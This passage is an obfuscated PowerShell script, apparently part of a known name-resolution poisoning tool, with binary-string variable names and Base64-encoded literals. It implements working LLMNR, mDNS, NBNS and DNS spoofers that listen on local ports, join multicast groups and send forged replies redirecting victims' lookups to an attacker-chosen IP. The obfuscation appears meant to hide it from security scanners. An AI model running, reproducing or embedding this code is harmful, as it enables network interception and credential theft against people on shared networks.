                                if((${10111001101101100}.Exists({param($s) $s -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgAwACoAIAAkAHsAMAAxADEAMQAxADEAMAAxADAAMAAwADEAMAAxADEAMQAxAH0A')))})))
                                {
                                    ${01110001110000011} = [DateTime]${10111001101101100}.Find({param($s) $s -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgAwACoAIAAkAHsAMAAxADEAMQAxADEAMAAxADAAMAAwADEAMAAxADEAMQAxAH0A')))}).SubString(0,19)
                                    if((Get-Date) -ge ${01110001110000011}.AddMinutes($SpooferLearningInterval))
                                    {
                                        ${10111001101101100}.RemoveAt(${10111001101101100}.FindIndex({param($s) $s -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgAwACoAIAAkAHsAMAAxADEAMQAxADEAMAAxADAAMAAwADEAMAAxADEAMQAxAH0A')))}))
                                        ${00100100101110011} = $true
                                    }
                                    else
                                    {
                                        ${00100100101110011} = $false
                                    }
                                }
                                else
                                {           
                                    ${00100100101110011} = $true
                                }
                                if(${00100100101110011})
                                {
                                    ${01111011100010001} = [String](1..2 | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
                                    ${00101111000011010} = ${01111011100010001}.Split(" ") | %{[Char][System.Convert]::ToInt16($_,16)}
                                    ${01111011100010001} = ${01111011100010001} -replace " ","-"
                                    ${01101111111001011} = new-Object System.Net.Sockets.UdpClient
                                    ${01110010001011010} = ${01000111011000011}[13..(${01000111011000011}.Length - 5)]
                                    ${10000001010011100} = ${00101111000011010} +
                                                            0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                            (${01110010001011010}.Length - 1) +
                                                            ${01110010001011010} +
                                                            0x00,0x01,0x00,0x01
                                    ${00110111010110000} = New-Object System.Net.IPEndpoint([IPAddress]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgAyADQALgAwAC4AMAAuADIANQAyAA=='))),5355)
                                    ${01101111111001011}.Connect(${00110111010110000})
                                    ${01101111111001011}.Send(${10000001010011100},${10000001010011100}.Length)
                                    ${01101111111001011}.Close()
                                    ${10111001101101100}.Add("$(Get-Date -format s) ${01111011100010001} ${01111101000101111}") > $null
                                    ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] LLMNR request ${01111101000101111} sent to 224.0.0.252") > $null
                                }
                            }
                            ${10100101111000001} = _00011011100101100 -_01000110101110010 ${01111101000101111} -_10110011101001001 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABMAE0ATgBSAA=='))) -_10101011010010001 $LLMNR
                            ${01111011111100001} = ${10100101111000001}[0]
                            ${10100101111000001} = ${10100101111000001}[1]
                            if(${10100101111000001} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwByAGUAcwBwAG8AbgBzAGUAIABzAGUAbgB0AF0A'))))
                            {
                                if($SpooferLearning -eq 'N' -or !${10111001101101100}.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString(${01000111011000011}[0..1]) + " *"}))
                                {
                                    ${10011010011101000} = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
                                    ${10011010011101000}.SendBufferSize = 1024
                                    ${01111110111001001} = New-Object System.Net.IPEndpoint(${10100011000000011},${10010100010000001}) 
                                    ${10011010011101000}.SendTo(${01001111011111001},${01111110111001001}) > $null
                                    ${10011010011101000}.Close()
                                }
                                else
                                {
                                    ${00001000111000111} = $true
                                }
                            }
                            if(!${00001000111000111})
                            {
                                ${00101000010000101}.output_queue.Add("${01111011111100001} [$(Get-Date -format s)] LLMNR request for ${01111101000101111} received from ${10100011000000011} ${10100101111000001}") > $null
                            }
                        }
                    }
                }
                switch(${10010100010000001})
                {
                    5355 
                    {
                        if($SpooferLearning -eq 'Y' -and ${10111001101101100}.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString(${01000111011000011}[0..1]) + " *"}))
                        {
                            ${01111101000101111} = [System.Text.Encoding]::UTF8.GetString(${01000111011000011}[13..(${01000111011000011}.Length - 4)]) -replace "`0",""
                            [Byte[]]${01011010101101000} = ${01000111011000011}[(${01000111011000011}.Length - 4)..(${01000111011000011}.Length)]
                            ${01001010001001011} = [System.Net.IPAddress]${01011010101101000}
                            ${01001010001001011} = ${01001010001001011}.IPAddressToString
                            if(${00101000010000101}.valid_host_list -notcontains ${01111101000101111})
                            {
                                ${00101000010000101}.valid_host_list.Add(${01111101000101111}) > $null
                                ${00101000010000101}.output_queue.Add("[+] [$(Get-Date -format s)] ${01111101000101111} LLMNR response ${01001010001001011} received from ${10100011000000011} [added to valid host list]") > $null
                            }
                        }
                    }
                }
                if($Pcap -and ($PcapUDP -contains ${10010100010000001} -or $PcapUDP -contains ${00010000111011110} -or $PcapUDP -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA')))))
                {
                    if(${01000111011000011})
                    {
                        ${00010000010001001} = ([datetime]::UtcNow)-(Get-Date $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAvADEALwAxADkANwAwAA=='))))
                        ${10011000010010011} = [System.BitConverter]::GetBytes(${01001101000111010} + 14)
                        ${01100110111010111} = [System.BitConverter]::GetBytes([Int][Math]::Truncate(${00010000010001001}.TotalSeconds)) + 
                            [System.BitConverter]::GetBytes(${00010000010001001}.Milliseconds) + 
                            ${10011000010010011} +
                            ${10011000010010011} +
                            (,0x00 * 12) +
                            0x08,0x00 +
                            ${01011100000011010}[0..(${01001101000111010} - 1)]
                        switch ($Pcap)
                        {
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQA=')))
                            {
                                try
                                {
                                    ${10000101011100101}.Write(${01100110111010111},0,${01100110111010111}.Count)    
                                }
                                catch
                                {
                                    ${01100011111101101} = $_.Exception.Message
                                    ${01100011111101101} = ${01100011111101101} -replace "`n",""
                                    ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ${01100011111101101} $($_.InvocationInfo.Line.Trim())") > $null
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AbwByAHkA')))
                            {
                                ${00101000010000101}.pcap.AddRange(${01100110111010111}) 
                            }
                        }
                    }
                }
            }
        }
    }
    ${00110011001110100}.Close()
    ${00111110110001001}.Dispose()
    ${00111110110001001}.Close()
    ${10000101011100101}.Close()
}
${10101101000100000} = 
{
    param ($Inspect,$DNSTTL,$SpooferIP)
    ${10011110010011011} = $true
    ${10110100000100101} = New-object System.Net.IPEndPoint ([IPAddress]::Any,53)
    try
    {
        ${01001111001010101} = New-Object System.Net.Sockets.UdpClient 53
    }
    catch
    {
        ${00101000010000101}.output_queue.Add("[-] [$(Get-Date -format s)] Error starting DNS spoofer") > $null
        ${01100011111101101} = $_.Exception.Message
        ${01100011111101101} = ${01100011111101101} -replace "`n",""
        ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ${01100011111101101} $($_.InvocationInfo.Line.Trim())") > $null
        ${10011110010011011} = $false
    }
    ${01001111001010101}.Client.ReceiveTimeout = 5000
    ${10100001110100100} = [System.BitConverter]::GetBytes($DNSTTL)
    [Array]::Reverse(${10100001110100100})
    while(${00101000010000101}.running -and ${10011110010011011})
    {   
        try
        {
            ${00000111010001000} = ${01001111001010101}.Receive([Ref]${10110100000100101})
        }
        catch
        {
            ${01001111001010101}.Close()
            ${01001111001010101} = New-Object System.Net.Sockets.UdpClient 53
            ${01001111001010101}.Client.ReceiveTimeout = 5000
        }
        if(${00000111010001000} -and [System.BitConverter]::ToString(${00000111010001000}[10..11]) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAxAA=='))))
        {
            ${00111000011001100} = _01011111100111001 12 ${00000111010001000}
            ${01010000111011000} = ${00000111010001000}[12..(${00111000011001100}.Length + 13)]
            ${10011011000100010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0A')))
            ${00111011011101010} = ${00000111010001000}[0,1] +
                                    0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                    ${01010000111011000} +
                                    0x00,0x01,0x00,0x01 +
                                    ${01010000111011000} +
                                    0x00,0x01,0x00,0x01 +
                                    ${10100001110100100} +
                                    0x00,0x04 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
            ${10100011000000011} = ${10110100000100101}.Address
            ${00011111000001001} = _00011011100101100 -_01000110101110010 ${00111000011001100} -_10110011101001001 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMA'))) -_10101011010010001 $DNS
            ${10011011000100010} = ${00011111000001001}[0]
            ${00011111000001001} = ${00011111000001001}[1]
            if(${00011111000001001} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwByAGUAcwBwAG8AbgBzAGUAIABzAGUAbgB0AF0A'))))
            {
                ${00100001100110011} = New-Object System.Net.IPEndpoint(${10110100000100101}.Address,${10110100000100101}.Port)
                ${01001111001010101}.Connect(${00100001100110011})
                ${01001111001010101}.Send(${00111011011101010},${00111011011101010}.Length)
                ${01001111001010101}.Close()
                ${01001111001010101} = New-Object System.Net.Sockets.UdpClient 53
                ${01001111001010101}.Client.ReceiveTimeout = 5000
            }
            ${00101000010000101}.output_queue.Add("${10011011000100010} [$(Get-Date -format s)] DNS request for ${00111000011001100} received from ${10100011000000011} ${00011111000001001}") > $null
            ${00000111010001000} = $null
        }
    }
    ${01001111001010101}.Close()
}
${10100110000000100} = 
{
    param ($Inspect,$LLMNRTTL,$SpooferIP,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore,$SpooferNonprintable)
    ${10111110010111000} = $true
    ${00101011011111100} = New-Object System.Net.IPEndPoint ([IPAddress]::Any,5355)
    try
    {
        ${01101111111001011} = New-Object System.Net.Sockets.UdpClient
        ${01101111111001011}.ExclusiveAddressUse = $false
        ${01101111111001011}.Client.SetSocketOption($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAGMAawBlAHQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHUAcwBlAEEAZABkAHIAZQBzAHMA'))), $true)
        ${01101111111001011}.Client.Bind(${00101011011111100})
    }
    catch
    {
        ${00101000010000101}.output_queue.Add("[-] [$(Get-Date -format s)] Error starting LLMNR spoofer") > $null
        ${01100011111101101} = $_.Exception.Message
        ${01100011111101101} = ${01100011111101101} -replace "`n",""
        ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ${01100011111101101} $($_.InvocationInfo.Line.Trim())") > $null
        ${10111110010111000} = $false
    }
    ${00010101100101111} = [IPAddress]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgAyADQALgAwAC4AMAAuADIANQAyAA==')))
    ${01101111111001011}.JoinMulticastGroup(${00010101100101111})
    ${01101111111001011}.Client.ReceiveTimeout = 5000
    ${00110011000000110} = [System.BitConverter]::GetBytes($LLMNRTTL)
    [Array]::Reverse(${00110011000000110})
    while(${00101000010000101}.running -and ${10111110010111000})
    {   
        try
        {
            ${01100000100001111} = ${01101111111001011}.Receive([Ref]${00101011011111100})
        }
        catch
        {      
            ${01101111111001011}.Close()
            ${00101011011111100} = New-Object System.Net.IPEndPoint ([IPAddress]::Any,5355)
            ${01101111111001011} = New-Object System.Net.Sockets.UdpClient
            ${01101111111001011}.ExclusiveAddressUse = $false
            ${01101111111001011}.Client.SetSocketOption($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAGMAawBlAHQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHUAcwBlAEEAZABkAHIAZQBzAHMA'))), $true)
            ${01101111111001011}.Client.Bind(${00101011011111100})
            ${00010101100101111} = [IPAddress]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgAyADQALgAwAC4AMAAuADIANQAyAA==')))
            ${01101111111001011}.JoinMulticastGroup(${00010101100101111})
            ${01101111111001011}.Client.ReceiveTimeout = 5000
        }
        if(${01100000100001111} -and [System.BitConverter]::ToString(${01100000100001111}[(${01100000100001111}.Length - 4)..(${01100000100001111}.Length - 3)]) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMQBjAA==')))) 
        {
            ${01001111011111001} = ${01100000100001111}[0,1] +
                                     0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                     ${01100000100001111}[12..${01100000100001111}.Length] +
                                     ${01100000100001111}[12..${01100000100001111}.Length] +
                                     ${00110011000000110} +
                                     0x00,0x04 +
                                     ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
            ${01111101000101111} = [Text.Encoding]::UTF8.GetString(${01100000100001111}[13..(${01100000100001111}[12] + 12)])     
            ${10100011000000011} = ${00101011011111100}.Address
            ${01111011111100001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0A')))
            if(!${00101000010000101}.request_table.ContainsKey(${01111101000101111}))
            {
                ${00101000010000101}.request_table.Add(${01111101000101111}.ToLower(),[Array]${10100011000000011}.IPAddressToString)
                ${00101000010000101}.request_table_updated = $true
            }
            else
            {
                ${00101000010000101}.request_table.${01111101000101111} += ${10100011000000011}.IPAddressToString
                ${00101000010000101}.request_table_updated = $true
            }
            ${10100101111000001} = _00011011100101100 -_01000110101110010 ${01111101000101111} -_10110011101001001 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABMAE0ATgBSAA=='))) -_10101011010010001 $LLMNR
            ${01111011111100001} = ${10100101111000001}[0]
            ${10100101111000001} = ${10100101111000001}[1]
            if(${10100101111000001} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwByAGUAcwBwAG8AbgBzAGUAIABzAGUAbgB0AF0A'))))
            {
                ${00001001010000000} = New-Object Net.IPEndpoint(${00101011011111100}.Address,${00101011011111100}.Port)
                ${01101111111001011}.Connect(${00001001010000000})
                ${01101111111001011}.Send(${01001111011111001},${01001111011111001}.Length)
                ${01101111111001011}.Close()
                ${01101111111001011} = New-Object System.Net.Sockets.UdpClient
                ${01101111111001011}.ExclusiveAddressUse = $false
                ${01101111111001011}.Client.SetSocketOption($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAGMAawBlAHQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHUAcwBlAEEAZABkAHIAZQBzAHMA'))), $true)
                ${01101111111001011}.Client.Bind(${00101011011111100})
                ${00010101100101111} = [IPAddress]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgAyADQALgAwAC4AMAAuADIANQAyAA==')))
                ${01101111111001011}.JoinMulticastGroup(${00010101100101111})
                ${01101111111001011}.Client.ReceiveTimeout = 5000
            }
            if(${01100000100001111})
            {
                ${00101000010000101}.output_queue.Add("${01111011111100001} [$(Get-Date -format s)] LLMNR request for ${01111101000101111} received from ${10100011000000011} ${10100101111000001}") > $null
            }
            ${01100000100001111} = $null
        }
    }
    ${00101000010000101}.output_queue.Add("[-] [$(Get-Date -format s)] leaving") > $null
    ${01101111111001011}.Close()
 }
${10001000000111000} = 
{
    param ($Inspect,$mDNSTTL,$mDNSTypes,$SpooferIP,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore)
    ${10001000000110000} = $true
    ${10110101010101001} = New-object System.Net.IPEndPoint ([IPAddress]::Any,5353)
    try
    {
        ${10111111111000000} = New-Object System.Net.Sockets.UdpClient
        ${10111111111000000}.ExclusiveAddressUse = $false
        ${10111111111000000}.Client.SetSocketOption($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAGMAawBlAHQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHUAcwBlAEEAZABkAHIAZQBzAHMA'))), $true)
        ${10111111111000000}.Client.Bind(${10110101010101001})
    }
    catch
    {
        ${00101000010000101}.output_queue.Add("[-] [$(Get-Date -format s)] Error starting mDNS spoofer") > $null
        ${01100011111101101} = $_.Exception.Message
        ${01100011111101101} = ${01100011111101101} -replace "`n",""
        ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ${01100011111101101} $($_.InvocationInfo.Line.Trim())") > $null
        ${10001000000110000} = $false
    }
    ${00000110110001110} = [IPAddress]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgAyADQALgAwAC4AMAAuADIANQAxAA==')))
    ${10111111111000000}.JoinMulticastGroup(${00000110110001110})
    ${10111111111000000}.Client.ReceiveTimeout = 5000
    ${00100001011001001} = [System.BitConverter]::GetBytes($mDNSTTL)
    [Array]::Reverse(${00100001011001001})
    while(${00101000010000101}.running -and ${10001000000110000})
    {   
        try
        {
            ${10001011011100100} = ${10111111111000000}.Receive([Ref]${10110101010101001})
        }
        catch
        {
            ${10111111111000000}.Close()
            ${10111111111000000} = New-Object System.Net.Sockets.UdpClient
            ${10111111111000000}.ExclusiveAddressUse = $false
            ${10111111111000000}.Client.SetSocketOption($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAGMAawBlAHQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHUAcwBlAEEAZABkAHIAZQBzAHMA'))), $true)
            ${10111111111000000}.Client.Bind(${10110101010101001})
            ${00000110110001110} = [IPAddress]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgAyADQALgAwAC4AMAAuADIANQAxAA==')))
            ${10111111111000000}.JoinMulticastGroup(${00000110110001110})
            ${10111111111000000}.Client.ReceiveTimeout = 5000
        }
        if(([System.BitConverter]::ToString(${10001011011100100})).EndsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADEALQA4ADAALQAwADEA')))) -and [System.BitConverter]::ToString(${10001011011100100}[4..11]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAxAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
        {
            ${10100011000000011} = ${10110101010101001}.Address
            ${00100110001010010} = _01011111100111001 12 ${10001011011100100}
            ${10110111010110011} = (${00100110001010010}.Split("."))[0]
            ${00100100011010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0A')))
            ${00011100111011101} = ${10001011011100100}[0,1] +
                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                    ${10001011011100100}[12..(${00100110001010010}.Length + 13)] +
                                    0x00,0x01,0x00,0x01 +
                                    ${00100001011001001} +
                                    0x00,0x04 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
            ${01001100000100101} = _00011011100101100 -_01000110101110010 ${10110111010110011}  -_10110011101001001 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBEAE4AUwA='))) -_10110000100111011 "QU" -_10101011010010001 $mDNS
            ${00100100011010011} = ${01001100000100101}[0]
            ${01001100000100101} = ${01001100000100101}[1]
            if(${01001100000100101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwByAGUAcwBwAG8AbgBzAGUAIABzAGUAbgB0AF0A'))))
            {
                ${01100110100001100} = New-Object Net.IPEndpoint(${10110101010101001}.Address,${10110101010101001}.Port)
                ${10111111111000000}.Connect(${01100110100001100})
                ${10111111111000000}.Send(${00011100111011101},${00011100111011101}.Length)
                ${10111111111000000}.Close()
                ${10111111111000000} = New-Object System.Net.Sockets.UdpClient
                ${10111111111000000}.ExclusiveAddressUse = $false
                ${10111111111000000}.Client.SetSocketOption($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAGMAawBlAHQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHUAcwBlAEEAZABkAHIAZQBzAHMA'))), $true)
                ${10111111111000000}.Client.Bind(${10110101010101001})
                ${00000110110001110} = [IPAddress]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgAyADQALgAwAC4AMAAuADIANQAxAA==')))
                ${10111111111000000}.JoinMulticastGroup(${00000110110001110})
                ${10111111111000000}.Client.ReceiveTimeout = 5000
            }
            if(${10001011011100100})
            {
                ${00101000010000101}.output_queue.Add("${00100100011010011} [$(Get-Date -format s)] mDNS(QU) request ${00100110001010010} received from ${10100011000000011} ${01001100000100101}") > $null
            }
            ${10001011011100100} = $null
        }
        elseif(([System.BitConverter]::ToString(${10001011011100100})).EndsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADEA')))) -and ([System.BitConverter]::ToString(
            ${10001011011100100}[4..11]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAxAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))) -or [System.BitConverter]::ToString(${10001011011100100}[4..11]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAyAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAA==')))))
        {
            ${10100011000000011} = ${10110101010101001}.Address
            ${00100110001010010} = _01011111100111001 12 ${10001011011100100}
            ${10110111010110011} = (${00100110001010010}.Split("."))[0]
            ${00100100011010011} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0A')))
            ${00011100111011101} = ${10001011011100100}[0,1] +
                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                    ${10001011011100100}[12..(${00100110001010010}.Length + 13)] +
                                    0x00,0x01,0x00,0x01 +
                                    ${00100001011001001} +
                                    0x00,0x04 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()        
            ${01001100000100101} = _00011011100101100 -_01000110101110010 ${10110111010110011}  -_10110011101001001 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBEAE4AUwA='))) -_10110000100111011 "QM" -_10101011010010001 $mDNS
            ${00100100011010011} = ${01001100000100101}[0]
            ${01001100000100101} = ${01001100000100101}[1]
            if(${01001100000100101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwByAGUAcwBwAG8AbgBzAGUAIABzAGUAbgB0AF0A'))))
            {
                ${01100110100001100} = New-Object Net.IPEndpoint([IPAddress]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgAyADQALgAwAC4AMAAuADIANQAxAA=='))),5353)
                ${10111111111000000}.Connect(${01100110100001100})
                ${10111111111000000}.Send(${00011100111011101},${00011100111011101}.Length)
                ${10111111111000000}.Close()
                ${10111111111000000} = new-Object System.Net.Sockets.UdpClient 5353
                ${00000110110001110} = [IPAddress]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgAyADQALgAwAC4AMAAuADIANQAxAA==')))
                ${10111111111000000}.JoinMulticastGroup(${00000110110001110})
                ${10111111111000000}.Client.ReceiveTimeout = 5000
            }
            if(${10001011011100100})                   
            {
                ${00101000010000101}.output_queue.Add("${00100100011010011} [$(Get-Date -format s)] mDNS(QM) request ${00100110001010010} received from ${10100011000000011} ${01001100000100101}") > $null
            }
            ${10001011011100100} = $null
        }
    }
    ${10111111111000000}.Close()
}
${10011001111010100} = 
{
    param ($Inspect,$IP,$NBNSTTL,$NBNSTypes,$SpooferIP,$SpooferHostsIgnore,$SpooferHostsReply,
        $SpooferIPsIgnore,$SpooferIPsReply,$SpooferNonprintable)
    ${00111001001001001} = $true
    ${01010000110100101} = New-Object System.Net.IPEndPoint ([IPAddress]::Broadcast,137)
    try
    {
        ${01110000000000111} = New-Object System.Net.Sockets.UdpClient 137
    }
    catch
    {
        ${00101000010000101}.output_queue.Add("[-] [$(Get-Date -format s)] Error starting NBNS spoofer") > $null
        ${01100011111101101} = $_.Exception.Message
        ${01100011111101101} = ${01100011111101101} -replace "`n",""
        ${00101000010000101}.output_queue.Add("[!] [$(Get-Date -format s)] ${01100011111101101} $($_.InvocationInfo.Line.Trim())") > $null
        ${00111001001001001} = $false
    }
    ${01110000000000111}.Client.ReceiveTimeout = 5000
    ${01101101001000011} = [System.BitConverter]::GetBytes($NBNSTTL)
    [Array]::Reverse(${01101101001000011})
    while(${00101000010000101}.running -and ${00111001001001001})
    {
        try
        {
            ${00111011110101111} = ${01110000000000111}.Receive([Ref]${01010000110100101})
        }
        catch
        {
            ${01110000000000111}.Close()
            ${01110000000000111} = New-Object System.Net.Sockets.UdpClient 137
            ${01110000000000111}.Client.ReceiveTimeout = 5000
        }
        if(${00111011110101111} -and [System.BitConverter]::ToString(${00111011110101111}[10..11]) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAxAA=='))))
        {
            ${01101101001000011} = [System.BitConverter]::GetBytes($NBNSTTL)
            [Array]::Reverse(${01101101001000011})
            ${01000010100010010} = ${00111011110101111}[0,1] +
                                    0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                                    ${00111011110101111}[13..${00111011110101111}.Length] +
                                    ${01101101001000011} +
                                    0x00,0x06,0x00,0x00 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes() +
                                    0x00,0x00,0x00,0x00
            ${10100011000000011} = ${01010000110100101}.Address
            ${01110100101111101} = [System.BitConverter]::ToString(${00111011110101111}[43..44])
            ${01110100101111101} = _01110000001101110 ${01110100101111101}
            ${01010100101011110} = ${00111011110101111}[47]
            ${01001010100100111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0A')))
            ${10011011111100110} = [System.BitConverter]::ToString(${00111011110101111}[13..(${00111011110101111}.Length - 4)])
            ${10011011111100110} = ${10011011111100110} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
            ${10011011111100110} = ${10011011111100110}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
            ${00111101101110100} = New-Object System.String (${10011011111100110},0,${10011011111100110}.Length)
            ${01010110110100000} = ${00111101101110100}
            ${00111101101110100} = ${00111101101110100}.Substring(0,${00111101101110100}.IndexOf("CA"))
            ${00101100110111110} = $null
            ${01101100010000010} = $null
            ${10110111111001011} = 0
            do
            {
                ${01111101111001110} = (([Byte][Char](${00111101101110100}.Substring(${10110111111001011},1))) - 65)
                ${00101100110111110} += ([System.Convert]::ToString(${01111101111001110},16))
                ${10110111111001011} += 1
            }
            until(${10110111111001011} -ge (${00111101101110100}.Length))
            ${10110111111001011} = 0
            do
            {
                ${01101100010000010} += ([Char]([System.Convert]::ToInt16(${00101100110111110}.Substring(${10110111111001011},2),16)))
                ${10110111111001011} += 2
            }
            until(${10110111111001011} -ge (${00101100110111110}.Length) -or ${01101100010000010}.Length -eq 15)
            if(${01010110110100000}.StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBCAEEAQwA=')))) -and ${01010110110100000}.EndsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAEEAQgA=')))))
            {
                ${01101100010000010} = ${01101100010000010}.Substring(2)
                ${01101100010000010} = ${01101100010000010}.Substring(0, ${01101100010000010}.Length - 1)
                ${01101100010000010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PAAwADEAPgA8ADAAMgA+AA=='))) + ${01101100010000010} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PAAwADIAPgA=')))
            }
            if(${01101100010000010} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBeAFwAeAAwADAALQBcAHgANwBGAF0AKwA='))))
            {
                if(!${00101000010000101}.request_table.ContainsKey(${01101100010000010}))
                {
                    ${00101000010000101}.request_table.Add(${01101100010000010}.ToLower(),[Array]${10100011000000011}.IPAddressToString)
                    ${00101000010000101}.request_table_updated = $true
                }
                else
                {
                    ${00101000010000101}.request_table.${01101100010000010} += ${10100011000000011}.IPAddressToString
                    ${00101000010000101}.request_table_updated = $true
                }
            }
            ${10101000000110001} = _00011011100101100 -_01000110101110010 ${01101100010000010} -_10110011101001001 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBCAE4AUwA='))) -_10101011010010001 $NBNS -_10111010100100110 ${01010100101011110}
            ${01001010100100111} = ${10101000000110001}[0]
            ${10101000000110001} = ${10101000000110001}[1]
            if(${10101000000110001} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwByAGUAcwBwAG8AbgBzAGUAIABzAGUAbgB0AF0A'))))
            {
                ${10111101100111101} = New-Object System.Net.IPEndpoint(${01010000110100101}.Address,${01010000110100101}.Port)
                ${01110000000000111}.Connect(${10111101100111101})
                ${01110000000000111}.Send(${01000010100010010},${01000010100010010}.Length)
                ${01110000000000111}.Close()
                ${01110000000000111} = New-Object System.Net.Sockets.UdpClient 137
                ${01110000000000111}.Client.ReceiveTimeout = 5000
            }
            if(${00111011110101111})                   
            {
                ${00101000010000101}.output_queue.Add("${01001010100100111} [$(Get-Date -format s)] NBNS request ${01101100010000010}<${01110100101111101}> received from ${10100011000000011} ${10101000000110001}") > $null    
            }
            ${00111011110101111} = $null
        }
    }
    ${01110000000000111}.Close()
 }
${01000110011110000} = 
{
